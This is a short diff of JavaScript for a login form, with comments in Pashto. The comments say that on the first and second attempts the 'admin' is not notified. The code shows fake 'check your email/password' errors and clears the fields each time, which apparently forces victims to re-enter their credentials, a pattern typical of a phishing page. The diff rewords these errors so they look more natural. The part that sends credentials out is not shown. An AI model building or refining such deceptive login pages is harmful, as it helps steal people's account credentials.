@@ -223,7 +223,7 @@ button:hover{
 
         // ساده ایمیل تایید
         if (!email.includes('@') || !email.includes('.')) {
-            showError('Please enter a valid email address');
+            showError('Please check your email');
             return;
         }
 
@@ -240,7 +240,7 @@ button:hover{
 
         // لومړۍ هڅه - تېروتنه (اډمن ته خبر نه ځي)
         if (currentAttempt === 1) {
-            showError('❌ Please check your email.');
+            showError('Please check your email');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
@@ -248,7 +248,7 @@ button:hover{
 
         // دوهمه هڅه - تېروتنه (اډمن ته خبر نه ځي)
         if (currentAttempt === 2) {
-            showError('❌ Please check your password.');
+            showError('Please check your password');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
